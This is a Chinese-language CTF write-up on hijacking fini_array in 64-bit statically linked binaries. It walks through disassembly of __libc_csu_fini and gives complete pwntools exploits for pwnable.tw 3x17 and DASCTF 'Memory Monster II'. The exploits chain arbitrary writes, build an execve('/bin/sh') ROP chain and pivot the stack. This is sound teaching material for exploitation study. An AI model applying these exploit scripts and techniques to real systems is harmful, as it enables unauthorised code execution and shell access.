# 劫持 64 位 fini_array 进行 ROP 攻击

## 程序起点

程序的启动流程如图所示：

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627002443.png)

可以看到 main 函数不是程序起点，之前写的 格式化字符串盲打 也分析过 text 段起点是 \_start 函数 。\_start 函数调用\_\_libc\_start\_main 完成启动和退出工作。具体看看 _start 函数：

```c
.text:0000000000401A60                 public start
.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000401A60 ; __unwind {
.text:0000000000401A60                 xor     ebp, ebp
.text:0000000000401A62                 mov     r9, rdx
.text:0000000000401A65                 pop     rsi
.text:0000000000401A66                 mov     rdx, rsp
.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000401A6D                 push    rax
.text:0000000000401A6E                 push    rsp
// 以此将 fini、init、main 地址压入寄存器
.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini
.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init
.text:0000000000401A7D                 mov     rdi, offset main
.text:0000000000401A84                 db      67h
.text:0000000000401A84                 call    __libc_start_main
.text:0000000000401A8A                 hlt
.text:0000000000401A8A ; } // starts at 401A60
.text:0000000000401A8A start           endp
```

[__libc_start_main 定义原型](https://refspecs.linuxfoundation.org/LSB_4.0.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html)：

```c
int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end));
```

根据 64 位传参特定得出对应寄存器值。这个执行顺序我是通过调试得出来的。（__libc_csu_init 的话是 ret2csu 利用对象。）

```c
rdi <- main
rcx <- __libc_csu_init    //在main函数前执行
r8 <- __libc_csu_fini    //在main函数后执行
```

## __libc_csu_fini 函数

\_\_libc_csu_fini 函数是 main 函数退出返回到 \_\_libc_start_main 后，通过 \_\_libc_start_main 调用的。具体看看函数：

```c
.text:0000000000402960 __libc_csu_fini proc near               ; DATA XREF: start+F↑o
.text:0000000000402960 ; __unwind {
.text:0000000000402960                 push    rbp
.text:0000000000402961                 lea     rax, unk_4B4100
.text:0000000000402968                 lea     rbp, _fini_array_0
.text:000000000040296F                 push    rbx
.text:0000000000402970                 sub     rax, rbp
.text:0000000000402973                 sub     rsp, 8
.text:0000000000402977                 sar     rax, 3
.text:000000000040297B                 jz      short loc_402996
.text:000000000040297D                 lea     rbx, [rax-1]
.text:0000000000402981                 nop     dword ptr [rax+00000000h]
.text:0000000000402988
.text:0000000000402988 loc_402988:                             ; CODE XREF: __libc_csu_fini+34↓j
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
.text:000000000040298C                 sub     rbx, 1
.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh
.text:0000000000402994                 jnz     short loc_402988
.text:0000000000402996
.text:0000000000402996 loc_402996:                             ; CODE XREF: __libc_csu_fini+1B↑j
.text:0000000000402996                 add     rsp, 8
.text:000000000040299A                 pop     rbx
.text:000000000040299B                 pop     rbp
.text:000000000040299C                 jmp     sub_48E32C
.text:000000000040299C ; } // starts at 402960
.text:000000000040299C __libc_csu_fini endp
```

注意以下这三行源码，是劫持 fini_array 实现无限写进行 ROP 的关键：

```c
//将 fini_array[0] 的值加载到 rbp
.text:0000000000402968                 lea     rbp, _fini_array_0
//经过一系列运算后，这里会 call fini_array[1] ，也就是调用存储在 fini_array[1] 的指针
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
//调用完 fini_array[1] 之后再次进过一系列运算，这里会 call fini_array[0]
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
```

看一下 fini_array 的代码：

```c
.fini_array:00000000004B40F0 _fini_array     segment para public 'DATA' use64
.fini_array:00000000004B40F0                 assume cs:_fini_array
.fini_array:00000000004B40F0                 ;org 4B40F0h
.fini_array:00000000004B40F0 _fini_array_0   dq offset sub_401B00    ; DATA XREF: .text:000000000040291C↑o
.fini_array:00000000004B40F0                                         ; __libc_csu_fini+8↑o
.fini_array:00000000004B40F8                 dq offset sub_401580
.fini_array:00000000004B40F8 _fini_array     ends
```

这里明确知道了 fini_array 里面存储了两个指针，调用顺序为：先 fini_array[1] ，再 fini_array[0] 。那么**如果我们把 fini_array[1] 覆盖为函数 A 的地址，fini_array[0] 覆盖为 \_\_libc_csu_fini 的地址 **，当退出 main 后，程序会这样：

```
__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini

__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini

__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini

......
```

这个循环就会一直持续到 fini_array[0] 被覆盖为其他值。

还有个点就是上面提到的源码中的 ``lea     rbp, _fini_array_0`` ，将 rbp 的值修改为 fini_array[0] 所在的地址，那么配合 ``leave|ret`` 就能将栈迁移到 fini_array + 0x10 的地址，我们就将利用函数放在这个地方。

## pwnable.tw-3x17

### 保护情况

静态链接的 64 位程序：

```shell
skye:~/CTF学习/fini_array劫持$ file 317
317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
```

checksec 检查是没有 canary 但是根据汇编去检查**是有 canary 保护**的：

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
![](https://mrskye.cn-gd.ufileos.com/img/2020-07-07-dmQW7YTLcYVKJeGN.png)

### 漏洞函数

题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，或者通过字符串定位到 main 函数位置（shift+F12）。

main 函数中一个任意地址写入 0x18 的功能：

```C
//重命名部分函数名
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // ST08_8
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write_fun(1u, "addr:", 5uLL);
    read_fun(0, &buf, 0x18uLL);//读取地址
    v4 = (char *)(signed int)sub_40EE70((__int64)&buf);
    write_fun(1u, "data:", 5uLL);
    read_fun(0, v4, 0x18uLL);//向读取地址写入内容
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    sub_44A3E0();
  return result;
}
```

### 思路

> 这条题目还有其他解法，因为用这条题目学习 **fini_array 劫持**就记录这种做法。其他解法：[pwnable.tw_3x17](https://kirin-say.top/2019/02/08/pwnable-tw-3x17/)

静态编译程序只能用它的有东西 getshell 。写 shellcode 估计要 mprotect 给内容加上运行权限绕过 NX 保护；写个系统调用号可行一点。

那就需要用到写入功能函数了，如果需要符合本文学习内容，就需要一个任意地址写的函数，刚好 main 函数就是。现在明确思路：

1. 将 fini_array[1] 覆盖为 main 函数地址；fini_array[0] 覆盖为 \_\_libc_start_fini 地址；

2. 依次向 fini_array + 0x10 写入系统调用号利用代码；

3. 写入完成后，将 fini_array[0] 覆盖为 ``leave|ret``，将栈迁移到 fini_array + 0x10;

> 构建的系统调用命令：syscall(0x3b,addr_of_binsh,0,0)
>
> 相当于：execve(addr_of_binsh,0,0)
>
> 系统调用号查询：https://www.mrskye.cn/archives/168/

### exp

```python
from pwn import *
context.log_level = 'debug'

#p = process("./317")
p = remote("chall.pwnable.tw",10105)
elf = process("./317")

fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
esp = fini_array + 0x10
leave_ret = 0x401C4B
ret = 0x401016
 
rop_syscall = 0x471db5
rop_pop_rax = 0x41e4af
rop_pop_rdx = 0x446e35
rop_pop_rsi = 0x406c30
rop_pop_rdi = 0x401696
bin_sh_addr = 0x4B419A
 
def write(addr,data):
    p.recv()
    p.send(str(addr))
    p.recv()
    p.send(data)
 
def exp():
    # hijack fini_array
    #gdb.attach(p)
    write(fini_array,p64(libc_csu_fini) + p64(main_addr))
 
    # rop chain
    write(bin_sh_addr,"/bin/sh\x00")
    write(esp,p64(rop_pop_rax))
    write(esp+8,p64(0x3b))
    write(esp+16,p64(rop_pop_rdi))
    write(esp+24,p64(bin_sh_addr))
    write(esp+32,p64(rop_pop_rdx))
    write(esp+40,p64(0))
    write(esp+48,p64(rop_pop_rsi))
    write(esp+56,p64(0))
    write(esp+64,p64(rop_syscall))
 
    # stack pivoting
    write(fini_array,p64(leave_ret) + p64(ret))
 
if __name__ == '__main__':
    exp()
    p.interactive()
```

### 参考文章

* [[原创]pwnable.tw新手向write up(二) 3×17-x64静态编译程序的fini_array劫持](https://bbs.pediy.com/thread-259298.htm)

## Memory Monster II



> 题目来源 DASCTF 五月赛，作者为 TaQini ，[附件]([https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory%20Monster%20II](https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory Monster II))
>
> 这里和上面那条机会一样，下面是独立完成，详细记录一下

### 保护情况

checksec 检查是没有 canary 但是根据汇编去检查**是有 canary 保护**的：

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### 漏洞函数

题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，没有卵用只修复了两个函数，但是能看到 _start 函数：（重命名部分函数）

```c
.text:0000000000401B00                 public start
.text:0000000000401B00 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000401B00 ; __unwind {
.text:0000000000401B00                 xor     ebp, ebp
.text:0000000000401B02                 mov     r9, rdx
.text:0000000000401B05                 pop     rsi
.text:0000000000401B06                 mov     rdx, rsp
.text:0000000000401B09                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000401B0D                 push    rax
.text:0000000000401B0E                 push    rsp
.text:0000000000401B0F                 mov     r8, offset __libc_start_fini
.text:0000000000401B16                 mov     rcx, offset __libc_start_init
.text:0000000000401B1D                 mov     rdi, offset main
.text:0000000000401B24                 db      67h
.text:0000000000401B24                 call    sub_4020B0
.text:0000000000401B2A                 hlt
.text:0000000000401B2A ; } // starts at 401B00
.text:0000000000401B2A start           endp
```

依据规律知道三个 mov 依次是处理 \_\_libc_start_fini、\_\_libc_start_init、main 。从这里获取到关键参数： \_\_libc_start_fini、main 地址。

然后 gdb 调试，断点打在 \_\_libc_start_fini ，一直运行到 call 指令，rbp 存储的值就是 fini_array[0] 的地址 0x4b80b0 ：

![](https://mrskye.cn-gd.ufileos.com/img/2020-07-07-Fao8iqPT0I2CQDVU.png)

leave_ret 和 ret 通过 ROPgadget 直接能查到；rax、rdi、rsi、rdx 传参 gadget 也能找到，这几个 gadget 找那种只穿一个寄存器的：``pop rax;ret``。

### exp

```python
from pwn import *
context.log_level = 'debug'

p = process("./main")
elf = ELF("./main")

#hijack fini
libc_csu_fini = 0x0402CB0
main_addr = 0x0401C1D
fini_array = 0x4b80b0
esp = fini_array + 0x10
leave_ret = 0x0401cf3
ret = 0x0401016

#execve('/bin/sh',0,0)
rop_syscall = 0x46F745	
rop_pop_rax = 0x0000000000448fcc
rop_pop_rdx = 0x0000000000448415
rop_pop_rsi = 0x0000000000406f80
rop_pop_rdi = 0x0000000000401746
bin_sh_addr = 0x492895

def write(addr,data):
	p.sendlineafter('addr:',p64(addr))
	p.sendafter('data:',data)

# hijack fini_array
gdb.attach(p,'b *0x0402CB0')
write(fini_array,p64(libc_csu_fini) + p64(main_addr))

# rop chain
write(esp,p64(rop_pop_rax))
write(esp+8,p64(0x3b))
write(esp+16,p64(rop_pop_rdi))
write(esp+24,p64(bin_sh_addr))
write(esp+32,p64(rop_pop_rdx))
write(esp+40,p64(0))
write(esp+48,p64(rop_pop_rsi))
write(esp+56,p64(0))
write(esp+64,p64(rop_syscall))

# stack pivoting
#gdb.attach(p)
write(fini_array,p64(leave_ret) + p64(ret))
p.interactive()
```

## 参考文章

* [详解64位静态编译程序的fini_array劫持及ROP攻击](https://www.freebuf.com/articles/system/226003.html)

